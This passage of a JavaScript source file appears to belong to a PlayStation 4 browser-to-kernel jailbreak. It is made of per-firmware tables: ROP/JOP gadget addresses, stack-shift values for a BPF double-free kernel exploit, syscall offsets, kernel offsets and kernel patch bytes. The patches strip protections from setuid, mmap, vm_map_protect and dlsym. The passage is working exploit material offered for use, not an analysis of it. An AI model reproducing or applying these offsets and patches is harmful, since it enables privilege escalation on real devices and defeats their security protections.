    'jop2':                             0x006EF4E5, // 5.03-5.07
    'jop3':                             0x015CA41B, // 5.03-5.07
    'jop4':                             0x01284834, // 5.03-5.07
    'jop_mov rbp, rsp':                 0x000F094A, // 5.00-5.07
    'jop6':                             0x00272961, // 5.03-5.07

    'longjmp':                          0x000014E8, // 5.00-5.07
    'createThread':                     0x00779390, // 5.03-5.07
  };
} else if (fwFromUA === 5.50) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.50-6.20
    'jmp rax':                          0x00000082, // 4.50-5.56
    'ep':                               0x000000AD, // 4.50-5.56
    'pop rbp':                          0x000000B6, // 4.50-6.20
    'mov [rdi], rax':                   0x003BD04B, // 5.50-5.56
    'pop r8':                           0x000188A0, // 5.50-5.56
    'pop rax':                          0x00004575, // 5.50-5.56
    'mov rax, rdi':                     0x00005AD0, // 5.50-5.56
    'mov rax, [rax]':                   0x000F1ABA, // 5.50-5.56
    'pop rsi':                          0x00091D11, // 5.50-5.56
    'pop rdi':                          0x0003A5DF, // 5.50-5.56
    'pop rcx':                          0x00029451, // 5.50-5.56
    'pop rsp':                          0x0001F4AD, // 5.50-5.56
    'mov [rdi], rsi':                   0x00024CE2, // 5.50-5.56
    'pop rdx':                          0x0010AC52, // 5.50
    'pop r9':                           0x0146FF4F, // 5.50
    'jop':                              0x000C6A20, // 5.50-5.56
    'infloop':                          0x00003B1F, // 5.50-5.56
  };
} else if (fwFromUA >= 5.53 && fwFromUA <= 5.56) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.50-6.20
    'jmp rax':                          0x00000082, // 4.50-5.56
    'ep':                               0x000000AD, // 4.50-5.56
    'pop rbp':                          0x000000B6, // 4.50-6.20
    'mov [rdi], rax':                   0x000BEF5C, // 5.50-5.56
    'pop r8':                           0x000188A5, // 5.50-5.56
    'pop rax':                          0x00004575, // 5.50-5.56
    'mov rax, rdi':                     0x00005AD0, // 5.50-5.56
    'mov rax, [rax]':                   0x000F1ABA, // 5.50-5.56
    'pop rsi':                          0x00091D11, // 5.50-5.56
    'pop rdi':                          0x0003A5DF, // 5.50-5.56
    'pop rcx':                          0x00029451, // 5.50-5.56
    'pop rsp':                          0x0001F4AD, // 5.50-5.56
    'mov [rdi], rsi':                   0x00024CE2, // 5.50-5.56
    'pop rdx':                          0x000BDD06, // 5.53-5.56
    'pop r9':                           0x0146FF6F, // 5.53-5.56
    'jop':                              0x000C6A20, // 5.50-5.56
    'infloop':                          0x00003B1F, // 5.50-5.56
  };
} else if (fwFromUA >= 6.00 && fwFromUA <= 6.02) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.50-6.20
    'infloop':                          0x00013AAE, // 6.00-6.20

    'pop rdi':                          0x00AC95F2, // 6.00-6.20
    'pop rsi':                          0x000756CB, // 6.00-6.20
    'pop rdx':                          0x002A9BA2, // 6.00-6.02
    'pop rcx':                          0x000348D3, // 6.00-6.20
    'pop r8':                           0x00079211, // 6.00-6.20
    'pop r9':                           0x000CDB41, // 6.00-6.20
    'pop rax':                          0x00075BDF, // 6.00-6.20
    'pop rbp':                          0x000000B6, // 4.50-6.20
    'pop rsp':                          0x00075D9A, // 6.00-6.20

    'mov rax, rdi':                     0x00008CD0, // 6.00-6.20
    'mov rdx, rdi':                     0x006271EE, // 6.00-6.02
    'mov rax, rdx':                     0x0007BC20, // 6.00-6.20
    'mov rax, [rax]':                   0x0002DC22, // 6.00-6.20
    'mov [rdi], rsi':                   0x00034EF0, // 6.00-6.20
    'mov [rdi], rax':                   0x0001FB49, // 6.00-6.20
    'mov [rax], rdi':                   0x01762997, // 6.00-6.02
    'mov [rax], rsi':                   0x0133138D, // 6.00-6.02
    'mov rdx, [rcx]':                   0x001848F4, // 6.00-6.20

    'add rax, rcx':                     0x000C3F62, // 6.00-6.20
    'add rax, rsi':                     0x013F9523, // 6.00-6.02
    'and rax, rcx':                     0x00746F34, // 6.00-6.02

    'jmp rdi':                          0x0000CEA5, // 6.00-6.20
  };
} else if (fwFromUA === 6.20) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.55-6.20
    'infloop':                          0x00013AAE, // 6.00-6.20

    'pop rdi':                          0x00AC95F2, // 6.00-6.20
    'pop rsi':                          0x000756CB, // 6.00-6.20
    'pop rdx':                          0x002516B2, // 6.20
    'pop rcx':                          0x000348D3, // 6.00-6.20
    'pop r8':                           0x00079211, // 6.00-6.20
    'pop r9':                           0x000CDB41, // 6.00-6.20
    'pop rax':                          0x00075BDF, // 6.00-6.20
    'pop rbp':                          0x000000B6, // 4.55-6.20
    'pop rsp':                          0x00075D9A, // 6.00-6.20

    'mov rax, rdi':                     0x00008CD0, // 6.00-6.20
    'mov rdx, rdi':                     0x006271FE, // 6.20
    'mov rax, rdx':                     0x0007BC20, // 6.00-6.20
    'mov rax, [rax]':                   0x0002DC22, // 6.00-6.20
    'mov [rdi], rsi':                   0x00034EF0, // 6.00-6.20
    'mov [rdi], rax':                   0x0001FB49, // 6.00-6.20
    'mov [rax], rdi':                   0x017629A7, // 6.20
    'mov [rax], rsi':                   0x0133139D, // 6.20
    'mov rdx, [rcx]':                   0x001848F4, // 6.00-6.20

    'add rax, rcx':                     0x000C3F62, // 6.00-6.20
    'add rax, rsi':                     0x013F9533, // 6.20
    'and rax, rcx':                     0x00746F44, // 6.20

    'jmp rdi':                          0x0000CEA5, // 6.00-6.20
  };
}

// Missing: <3.00
// Only used for BPF double free kernel exploit
// These are based on the JOP functions selected in libSceWebKit2.sprx
var gadget_shifts = {};
if (fwFromUA >= 3.00 && fwFromUA <= 4.07) {
  gadget_shifts = {
    'stackshift_jop1':                  0x00000018, // 3.00-4.07
    'stackshift_jop6':                  0x00000028, // 3.00-5.07
    'jump_shift_jop1':                  0x000003C0, // 3.00-4.07
    'jump_shift_jop5':                  0x00000410, // 3.00-4.07
    'jump_shift_jop6':                  0x00000358, // 3.00-4.07
  };
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.74) {
  gadget_shifts = {
    'stackshift_jop1':                  0x00000048, // 4.50-4.74
    'stackshift_jop6':                  0x00000028, // 3.50-5.07
    'jump_shift_jop1':                  0x000007D0, // 4.50-5.07
    'jump_shift_jop5':                  0x00000420, // 4.50-5.07
    'jump_shift_jop6':                  0x00000040, // 4.50-5.07
  };
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.07) {
  gadget_shifts = {
    'stackshift_jop1':                  0x00000058, // 5.00-5.07
    'stackshift_jop6':                  0x00000028, // 3.50-5.07
    'jump_shift_jop1':                  0x000007D0, // 4.50-5.07
    'jump_shift_jop5':                  0x00000420, // 4.50-5.07
    'jump_shift_jop6':                  0x00000040, // 4.50-5.07
  };
}

// Missing <=3.15
// Only used for FWs <=4.07
// These are from libkernel_web.sprx (libkernel.sprx on FWs <4.00)
var syscallMap = {};
if (fwFromUA >= 3.50 && fwFromUA <= 3.70) {
  syscallMap = {
    3:   0xAB20, // sys_read
    4:   0xAB40, // sys_write
    5:   0xAB60, // sys_open
    6:   0xAB80, // sys_close
    20:  0xACE0, // sys_getpid
    23:  0xAD40, // sys_setuid
    24:  0xAD60, // sys_getuid
    50:  0xDA10, // sys_setlogin
    54:  0xB0A0, // sys_ioctl
    73:  0xB1E0, // sys_munmap
    74:  0xB200, // sys_mprotect
    97:  0xB3E0, // sys_socket
    98:  0xB400, // sys_connect
    203: 0xB900, // sys_mlock
    324: 0xBD20, // sys_mlockall
    362: 0xBF40, // sys_kqueue
    363: 0xBF60, // sys_kevent
    477: 0xB1C0, // sys_mmap
    557: 0xCB80, // sys_namedobj_create
    558: 0xCBA0, // sys_namedobj_delete
    591: 0xCF80, // sys_dynlib_dlsym
    594: 0xCFE0, // sys_dynlib_load_prx
    601: 0xD0C0, // sys_mdbg_service
    632: 0xD4A0, // sys_thr_suspend_ucontext
    633: 0xD4C0, // sys_thr_resume_ucontext
    634: 0xD4E0, // sys_thr_get_ucontext
  };
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.07) {
  syscallMap = {
    3:   0x25F0, // sys_read
    4:   0x2730, // sys_write
    5:   0x2570, // sys_open
    6:   0x24D0, // sys_close
    20:  0x06F0, // sys_getpid
    23:  0x0710, // sys_setuid
    24:  0x0730, // sys_getuid
    50:  0x0640, // sys_setlogin
    54:  0x0970, // sys_ioctl
    73:  0x09F0, // sys_munmap
    74:  0x0A10, // sys_mprotect
    97:  0x0B70, // sys_socket
    98:  0x24F0, // sys_connect
    203: 0x1030, // sys_mlock
    324: 0x1230, // sys_mlockall
    362: 0x1390, // sys_kqueue
    363: 0x13B0, // sys_kevent
    477: 0x27B0, // sys_mmap
    557: 0x1AF0, // sys_namedobj_create
    558: 0x1B10, // sys_namedobj_delete
    591: 0x1D50, // sys_dynlib_dlsym
    594: 0x1DB0, // sys_dynlib_load_prx
    601: 0x1E70, // sys_mdbg_service
    632: 0x21D0, // sys_thr_suspend_ucontext
    633: 0x21F0, // sys_thr_resume_ucontext
    634: 0x2210, // sys_thr_get_ucontext
  };
}

// Missing: <=3.70 and all devkits
// These are from the decrypted/dumped kernel
var kernel_offsets = {};
if (fwFromUA === 3.50) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00242BA6, // 3.50
    '__stack_chk_guard':                0x0242AD10, // 3.50-3.55
    'kqueue_close_slide':               0x0017BB02, // 3.50
    'bpf_slide':                        0x0024BC63, // 3.50
    'jmp [rsi]':                        0x0008AEEA, // 3.50
    'cpu_setregs':                      0x003A6A40, // 3.50
    'mov cr0, rax':                     0x003A6A49, // 3.50
    'sys_setuid_patch_offset':          0x001A44A0, // 3.50
    'sys_mmap_patch_offset':            0x00349667, // 3.50
    'vm_map_protect_patch_offset':      0x00341383, // 3.50
    'amd64_syscall_patch1_offset':      0x0, /* CHECKTHIS */
    'amd64_syscall_patch2_offset':      0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch1_offset':   0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch2_offset':   0x0, /* CHECKTHIS */
    'syscall_11_patch1_offset':         0x00EEDA90, // 3.50-3.55
    'syscall_11_patch2_offset':         0x00EEDA98, // 3.50-3.55
    'syscall_11_patch3_offset':         0x00EEDAB8, // 3.50-3.55
  };
} else if (fwFromUA === 3.55) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00242CE6, // 3.55
    '__stack_chk_guard':                0x0242AD10, // 3.50-3.55
    'kqueue_close_slide':               0x0017BC22, // 3.55
    'bpf_slide':                        0x0024BDA3, // 3.55
    'jmp [rsi]':                        0x001EF468, // 3.55
    'cpu_setregs':                      0x003A6E80, // 3.55
    'mov cr0, rax':                     0x003A6E89, // 3.55
    'sys_setuid_patch_offset':          0x001A45C0, // 3.55
    'sys_mmap_patch_offset':            0x00349A97, // 3.55
    'vm_map_protect_patch_offset':      0x003417B3, // 3.55
    'amd64_syscall_patch1_offset':      0x0, /* CHECKTHIS */
    'amd64_syscall_patch2_offset':      0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch1_offset':   0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch2_offset':   0x0, /* CHECKTHIS */
    'syscall_11_patch1_offset':         0x00EEDA90, // 3.50-3.55
    'syscall_11_patch2_offset':         0x00EEDA98, // 3.50-3.55
    'syscall_11_patch3_offset':         0x00EEDAB8, // 3.50-3.55
  };
} else if (fwFromUA === 3.70) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00242DB6, // 3.70
    '__stack_chk_guard':                0x0243AD10, // 3.70
    'kqueue_close_slide':               0x0017BCF2, // 3.70
    'bpf_slide':                        0x0024BE73, // 3.70
    'jmp [rsi]':                        0x001CAD28, // 3.70
    'cpu_setregs':                      0x003A6F70, // 3.70
    'mov cr0, rax':                     0x003A6F79, // 3.70
    'sys_setuid_patch_offset':          0x001A4690, // 3.70
    'sys_mmap_patch_offset':            0x00349B67, // 3.70
    'vm_map_protect_patch_offset':      0x00341883, // 3.70
    'amd64_syscall_patch1_offset':      0x0, /* CHECKTHIS */
    'amd64_syscall_patch2_offset':      0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch1_offset':   0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch2_offset':   0x0, /* CHECKTHIS */
    'syscall_11_patch1_offset':         0x00EF6FA0, // 3.70
    'syscall_11_patch2_offset':         0x00EEDFA8, // 3.70
    'syscall_11_patch3_offset':         0x00EEDFC8, // 3.70
  };
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.01) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00109D66, // 4.00-4.01
    '__stack_chk_guard':                0x024600D0, // 4.00-4.06
    'kqueue_close_slide':               0x00233930, // 4.00-4.01
    'bpf_slide':                        0x003176D9, // 4.00-4.01
    'jmp [rsi]':                        0x00016B71, // 4.00-4.01
    'cpu_setregs':                      0x00389200, // 4.00-4.01
    'mov cr0, rax':                     0x00389209, // 4.00-4.01
    'sys_setuid_patch_offset':          0x00085BB0, // 4.00-4.07
    'sys_mmap_patch_offset':            0x0031CEAC, // 4.00-4.01
    'vm_map_protect_patch_offset':      0x004422B7, // 4.00-4.01
    'amd64_syscall_patch1_offset':      0x000ECFB6, // 4.00-4.01
    'amd64_syscall_patch2_offset':      0x000ECFDB, // 4.00-4.01
    'sys_dynlib_dlsym_patch1_offset':   0x0014A9AD, // 4.00-4.01
    'sys_dynlib_dlsym_patch2_offset':   0x000E2CC0, // 4.00-4.01
    'syscall_11_patch1_offset':         0x00F179A0, // 4.00-4.06
    'syscall_11_patch2_offset':         0x00F179A8, // 4.00-4.06
    'syscall_11_patch3_offset':         0x00F179C8, // 4.00-4.06
  };
} else if (fwFromUA === 4.05) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00109E96, // 4.05-4.07
    '__stack_chk_guard':                0x024600D0, // 4.00-4.06
    'kqueue_close_slide':               0x00233A60, // 4.05-4.07
    'bpf_slide':                        0x00317809, // 4.05
    'jmp [rsi]':                        0x00065750, // 4.05-4.07
    'cpu_setregs':                      0x00389330, // 4.05
    'mov cr0, rax':                     0x00389339, // 4.05
    'sys_setuid_patch_offset':          0x00085BB0, // 4.00-4.07
    'sys_mmap_patch_offset':            0x0031CFDC, // 4.05
    'vm_map_protect_patch_offset':      0x004423E7, // 4.05
    'amd64_syscall_patch1_offset':      0x000ED096, // 4.05-4.07
    'amd64_syscall_patch2_offset':      0x000ED0BB, // 4.05-4.07
    'sys_dynlib_dlsym_patch1_offset':   0x0014AADD, // 4.05-4.07
    'sys_dynlib_dlsym_patch2_offset':   0x000E2DA0, // 4.05-4.07
    'syscall_11_patch1_offset':         0x00F179A0, // 4.00-4.06
    'syscall_11_patch2_offset':         0x00F179A8, // 4.00-4.06
    'syscall_11_patch3_offset':         0x00F179C8, // 4.00-4.06
  };
} else if (fwFromUA === 4.06) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00109E96, // 4.05-4.07
    '__stack_chk_guard':                0x024600D0, // 4.00-4.06
    'kqueue_close_slide':               0x00233A60, // 4.05-4.07
    'bpf_slide':                        0x00317819, // 4.06-4.07
    'jmp [rsi]':                        0x00065750, // 4.05-4.07
    'cpu_setregs':                      0x00389340, // 4.06-4.07
    'mov cr0, rax':                     0x00389349, // 4.06-4.07
    'sys_setuid_patch_offset':          0x00085BB0, // 4.00-4.07
    'sys_mmap_patch_offset':            0x0031CFEC, // 4.06-4.07
    'vm_map_protect_patch_offset':      0x00442427, // 4.06-4.07
    'amd64_syscall_patch1_offset':      0x000ED096, // 4.05-4.07
    'amd64_syscall_patch2_offset':      0x000ED0BB, // 4.05-4.07
    'sys_dynlib_dlsym_patch1_offset':   0x0014AADD, // 4.05-4.07
    'sys_dynlib_dlsym_patch2_offset':   0x000E2DA0, // 4.05-4.07
    'syscall_11_patch1_offset':         0x00F179A0, // 4.00-4.06
    'syscall_11_patch2_offset':         0x00F179A8, // 4.00-4.06
    'syscall_11_patch3_offset':         0x00F179C8, // 4.00-4.06
  };
} else if (fwFromUA === 4.07) {
  kernel_offsets = {
    '_vn_lock_break_slide':             0x00109E96, // 4.05-4.07
    '__stack_chk_guard':                0x024640D0, // 4.07
    'kqueue_close_slide':               0x00233A60, // 4.05-4.07
    'bpf_slide':                        0x00317819, // 4.06-4.07
    'jmp [rsi]':                        0x00065750, // 4.05-4.07
    'cpu_setregs':                      0x00389340, // 4.06-4.07
    'mov cr0, rax':                     0x00389349, // 4.06-4.07
    'sys_setuid_patch_offset':          0x00085BB0, // 4.00-4.07
    'sys_mmap_patch_offset':            0x0031CFEC, // 4.06-4.07
    'vm_map_protect_patch_offset':      0x00442427, // 4.06-4.07
    'amd64_syscall_patch1_offset':      0x000ED096, // 4.05-4.07
    'amd64_syscall_patch2_offset':      0x000ED0BB, // 4.05-4.07
    'sys_dynlib_dlsym_patch1_offset':   0x0014AADD, // 4.05-4.07
    'sys_dynlib_dlsym_patch2_offset':   0x000E2DA0, // 4.05-4.07
    'syscall_11_patch1_offset':         0x00F1B9A0, // 4.07
    'syscall_11_patch2_offset':         0x00F1B9A8, // 4.07
    'syscall_11_patch3_offset':         0x00F1B9C8, // 4.07
  };
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.55) {
  kernel_offsets = {
    '__stack_chk_guard':                0x02610AD0, // 4.50-4.55
    'jmp [rsi]':                        0x0013A39F, // 4.50-4.55
    'kqueue_close_slide':               0x001E2640, // 4.50-4.55
    'cpu_setregs':                      0x00280F70, // 4.50-4.55
    'mov cr0, rax':                     0x00280F79, // 4.50-4.55
    'sys_setuid_patch_offset':          0x001144E3, // 4.50-4.55
    'sys_mmap_patch_offset':            0x00141D14, // 4.50-4.55
    'vm_map_protect_patch_offset':      0x00396A56, // 4.50-4.55
    'amd64_syscall_patch1_offset':      0x003DC603, // 4.50-4.55
    'amd64_syscall_patch2_offset':      0x003DC621, // 4.50-4.55
    'sys_dynlib_dlsym_patch1_offset':   0x003CF6FE, // 4.50-4.55
    'sys_dynlib_dlsym_patch2_offset':   0x000690C0, // 4.50-4.55
    'syscall_11_patch1_offset':         0x0102B8A0, // 4.50-4.55
    'syscall_11_patch2_offset':         0x0102B8A8, // 4.50-4.55
    'syscall_11_patch3_offset':         0x0102B8C8, // 4.50-4.55
  };
} else if (fwFromUA === 4.70) {
  kernel_offsets = {
    'jmp [rsi]':                        0x00139A2F, // 4.70-4.74
    'kqueue_close_slide':               0x001E48A0, // 4.70-4.74
    'cpu_setregs':                      0x00283190, // 4.70
    'mov cr0, rax':                     0x00283199, // 4.70
    'sys_setuid_patch_offset':          0x00113B73, // 4.70-4.74
    'sys_mmap_patch_offset':            0x001413A4, // 4.70-4.74
    'vm_map_protect_patch_offset':      0x003978E6, // 4.70
    'amd64_syscall_patch1_offset':      0x003DD523, // 4.70
    'amd64_syscall_patch2_offset':      0x003DD541, // 4.70
    'sys_dynlib_dlsym_patch1_offset':   0x003D061E, // 4.70
    'sys_dynlib_dlsym_patch2_offset':   0x000686A0, // 4.70-4.74
    'syscall_11_patch1_offset':         0x010349A0, // 4.70-4.74
    'syscall_11_patch2_offset':         0x010349A8, // 4.70-4.74
    'syscall_11_patch3_offset':         0x010349C8, // 4.70-4.74
  };
} else if (fwFromUA >= 4.71 && fwFromUA <= 4.74) {
  kernel_offsets = {
    'jmp [rsi]':                        0x00139A2F, // 4.70-4.74
    'kqueue_close_slide':               0x001E48A0, // 4.70-4.74
    'cpu_setregs':                      0x00283120, // 4.71-4.74
    'mov cr0, rax':                     0x00283129, // 4.71-4.74
    'sys_setuid_patch_offset':          0x00113B73, // 4.70-4.74
    'sys_mmap_patch_offset':            0x001413A4, // 4.70-4.74
    'vm_map_protect_patch_offset':      0x00397876, // 4.71-4.74
    'amd64_syscall_patch1_offset':      0x003DD4B3, // 4.71-4.74
    'amd64_syscall_patch2_offset':      0x003DD4D1, // 4.71-4.74
    'sys_dynlib_dlsym_patch1_offset':   0x003D05AE, // 4.71-4.74
    'sys_dynlib_dlsym_patch2_offset':   0x000686A0, // 4.70-4.74
    'syscall_11_patch1_offset':         0x010349A0, // 4.70-4.74
    'syscall_11_patch2_offset':         0x010349A8, // 4.70-4.74
    'syscall_11_patch3_offset':         0x010349C8, // 4.70-4.74
  };
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.01) {
  kernel_offsets = {
    'jmp [rsi]':                        0x00013460, // 5.00-5.07
    'kqueue_close_slide':               0x0016D762, // 5.00-5.01
    'cpu_setregs':                      0x00232F10, // 5.00-5.01
    'mov cr0, rax':                     0x00232F19, // 5.00-5.01
    'sys_setuid_patch_offset':          0x00054A72, // 5.00-5.07
    'sys_mmap_patch_offset':            0x0013D510, // 5.00-5.01
    'vm_map_protect_patch_offset':      0x001A3AF6, // 5.00-5.01
    'amd64_syscall_patch1_offset':      0x00000493, // 5.00-5.01
    'amd64_syscall_patch2_offset':      0x000004B1, // 5.00-5.01
    'sys_dynlib_dlsym_patch1_offset':   0x00237E2A, // 5.00-5.01
    'sys_dynlib_dlsym_patch2_offset':   0x002B2350, // 5.00-5.01
    'syscall_11_patch1_offset':         0x0107C820, // 5.00-5.07
    'syscall_11_patch2_offset':         0x0107C828, // 5.00-5.07
    'syscall_11_patch3_offset':         0x0107C848, // 5.00-5.07
  };
} else if (fwFromUA >= 5.03 && fwFromUA <= 5.07) {
  kernel_offsets = {
    'jmp [rsi]':                        0x00013460, // 5.00-5.07
    'kqueue_close_slide':               0x0016D872, // 5.03-5.07
    'cpu_setregs':                      0x00233020, // 5.03-5.07
    'mov cr0, rax':                     0x00233029, // 5.03-5.07
    'sys_setuid_patch_offset':          0x00054A72, // 5.00-5.07
    'sys_mmap_patch_offset':            0x0013D620, // 5.03-5.07
    'vm_map_protect_patch_offset':      0x001A3C06, // 5.03-5.07
    'amd64_syscall_patch1_offset':      0x00000493, // 5.03-5.07
    'amd64_syscall_patch2_offset':      0x000004B1, // 5.03-5.07
    'sys_dynlib_dlsym_patch1_offset':   0x00237F3A, // 5.03-5.07
    'sys_dynlib_dlsym_patch2_offset':   0x002B2620, // 5.03-5.07
    'syscall_11_patch1_offset':         0x0107C820, // 5.00-5.07
    'syscall_11_patch2_offset':         0x0107C828, // 5.00-5.07
    'syscall_11_patch3_offset':         0x0107C848, // 5.00-5.07
  };
} else if (fwFromUA === 6.50) {
  kernel_offsets = {
    'jmp [rsi]':                        0x00050F2D, // 6.50
    'kqueue_close_slide':               0x00185F92, // 6.50
    'cpu_setregs':                      0x000A1B70, // 6.50 /* CHECKTHIS */
    'mov cr0, rax':                     0x000A1B79, // 6.50 /* CHECKTHIS */
    'sys_setuid_patch_offset':          0x0010BB20, // 6.50
    'sys_mmap_patch_offset':            0x000AB57A, // 6.50
    'vm_map_protect_patch_offset':      0x00451A06, // 6.50
    'amd64_syscall_patch1_offset':      0x00000490, // 6.50-7.00
    'amd64_syscall_patch2_offset':      0x000004B3, // 6.50-7.00
    'sys_dynlib_dlsym_patch1_offset':   0x001D85AA, // 6.50
    'sys_dynlib_dlsym_patch2_offset':   0x00419F20, // 6.50
    'syscall_11_patch1_offset':         0x0111D210, // 6.50
    'syscall_11_patch2_offset':         0x0111D218, // 6.50
    'syscall_11_patch3_offset':         0x0111D238, // 6.50
  };
} else if (fwFromUA === 7.00) {
  kernel_offsets = {
    'jmp [rsi]':                        0x0006B192, // 7.00
    'kqueue_close_slide':               0x00079F02, // 7.00
    'cpu_setregs':                      0x004923E0, // 7.00 /* CHECKTHIS */
    'mov cr0, rax':                     0x004923ED, // 7.00 /* CHECKTHIS */
    'sys_setuid_patch_offset':          0x00087B70, // 7.00
    'sys_mmap_patch_offset':            0x001D2336, // 7.00
    'vm_map_protect_patch_offset':      0x00264C06, // 7.00
    'amd64_syscall_patch1_offset':      0x00000490, // 7.00
    'amd64_syscall_patch2_offset':      0x000004B3, // 7.00
    'sys_dynlib_dlsym_patch1_offset':   0x0009547B, // 7.00
    'sys_dynlib_dlsym_patch2_offset':   0x002F2C20, // 7.00
    'syscall_11_patch1_offset':         0x0, // 7.00 /* CHECKTHIS */
    'syscall_11_patch2_offset':         0x0, // 7.00 /* CHECKTHIS */
    'syscall_11_patch3_offset':         0x0, // 7.00 /* CHECKTHIS */
  };
}

// Missing: <=3.70 and all devkits
// These are from the decrypted/dumped kernel
var kernel_patches = {};
if (fwFromUA >= 3.50 && fwFromUA <= 3.70) {
  kernel_patches = {
    'sys_setuid_patch_1':               0x000000B8, // 3.50-7.00
    'sys_setuid_patch_2':               0x85C38900, // 3.50-4.07
    'sys_mmap_patch_1':                 0x37B54137, // 3.50-3.70
    'sys_mmap_patch_2':                 0x3145C031, // 3.50-7.00
    'vm_map_protect_patch_1':           0x9090CA39, // 3.50-3.70
    'vm_map_protect_patch_2':           0x90909090, // 3.50-7.00
    'amd64_syscall_patch1_1':           0x0, /* CHECKTHIS */
    'amd64_syscall_patch1_2':           0x0, /* CHECKTHIS */
    'amd64_syscall_patch2_1':           0x0, /* CHECKTHIS */
    'amd64_syscall_patch2_2':           0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch1_1':        0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch1_2':        0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch2_1':        0x0, /* CHECKTHIS */
    'sys_dynlib_dlsym_patch2_2':        0x0, /* CHECKTHIS */
  };
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.07) {
  kernel_patches = {
    'sys_setuid_patch_1':               0x000000B8, // 3.50-7.00
    'sys_setuid_patch_2':               0x85C38900, // 3.50-4.07
    'sys_mmap_patch_1':                 0x37B74137, // 4.05-4.07
    'sys_mmap_patch_2':                 0x3145C031, // 3.50-7.00
    'vm_map_protect_patch_1':           0x9090C239, // 4.00-4.07
    'vm_map_protect_patch_2':           0x90909090, // 3.50-7.00
    'amd64_syscall_patch1_1':           0x00000000, // 3.55-5.07
    'amd64_syscall_patch1_2':           0xF8858B48, // 4.00-4.07
    'amd64_syscall_patch2_1':           0x00007DE9, // 4.00-4.07
    'amd64_syscall_patch2_2':           0x72909000, // 4.00-4.07
    'sys_dynlib_dlsym_patch1_1':        0x0002A9E9, // 4.00-4.07
    'sys_dynlib_dlsym_patch1_2':        0x8B489000, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_1':        0x90C3C031, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_2':        0x90909090, // 3.55-7.00
  };
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.74) {
  kernel_patches = {
    'sys_setuid_patch_1':               0x000000B8, // 3.50-7.00
    'sys_setuid_patch_2':               0xC6894100, // 4.50-4.74
    'sys_mmap_patch_1':                 0x37B64137, // 4.50-4.74
    'sys_mmap_patch_2':                 0x3145C031, // 3.50-7.00
    'vm_map_protect_patch_1':           0x9090EA38, // 4.50-4.74 & 6.50
    'vm_map_protect_patch_2':           0x90909090, // 3.50-7.00
    'amd64_syscall_patch1_1':           0x00000000, // 3.55-5.07
    'amd64_syscall_patch1_2':           0x40878B49, // 4.50-5.07
    'amd64_syscall_patch2_1':           0x909079EB, // 4.50-4.74
    'amd64_syscall_patch2_2':           0x72909090, // 4.50-5.07
    'sys_dynlib_dlsym_patch1_1':        0x000352E9, // 4.05-4.74
    'sys_dynlib_dlsym_patch1_2':        0x8B489000, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_1':        0x90C3C031, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_2':        0x90909090, // 3.55-7.00
  };
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.07) {
  kernel_patches = {
    'sys_setuid_patch_1':               0x000000B8, // 3.50-7.00
    'sys_setuid_patch_2':               0xC4894100, // 5.00-5.07
    'sys_mmap_patch_1':                 0x37B64037, // 5.00-7.00
    'sys_mmap_patch_2':                 0x3145C031, // 3.50-7.00
    'vm_map_protect_patch_1':           0x9090FA38, // 5.00-5.07
    'vm_map_protect_patch_2':           0x90909090, // 3.50-7.00
    'amd64_syscall_patch1_1':           0x00000000, // 3.55-7.00
    'amd64_syscall_patch1_2':           0x40878B49, // 4.50-7.00
    'amd64_syscall_patch2_1':           0x90907DEB, // 5.00-5.07
    'amd64_syscall_patch2_2':           0x72909090, // 4.50-5.07
    'sys_dynlib_dlsym_patch1_1':        0x0001C1E9, // 5.00-5.07
    'sys_dynlib_dlsym_patch1_2':        0x8B489000, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_1':        0x90C3C031, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_2':        0x90909090, // 3.55-7.00
  };
} else if (fwFromUA === 6.50) {
  kernel_patches = {
    'sys_setuid_patch_1':               0x000000B8, // 3.50-7.00
    'sys_setuid_patch_2':               0x74C08500, // 6.50-7.00
    'sys_mmap_patch_1':                 0x37B64037, // 5.00-7.00
    'sys_mmap_patch_2':                 0x3145C031, // 3.50-7.00
    'vm_map_protect_patch_1':           0x9090EA38, // 4.50-4.74 & 6.50
    'vm_map_protect_patch_2':           0x90909090, // 3.50-7.00
    'amd64_syscall_patch1_1':           0x00000000, // 3.55-7.00
    'amd64_syscall_patch1_2':           0x40878B49, // 4.50-7.00
    'amd64_syscall_patch2_1':           0x00019DE9, // 6.50-7.00
    'amd64_syscall_patch2_2':           0x72909000, // 6.50-7.00
    'sys_dynlib_dlsym_patch1_1':        0x0001C7E9, // 6.50
    'sys_dynlib_dlsym_patch1_2':        0x8B489000, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_1':        0x90C3C031, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_2':        0x90909090, // 3.55-7.00
  };
} else if (fwFromUA === 7.00) {
  kernel_patches = {
    'sys_setuid_patch_1':               0x000000B8, // 3.50-7.00
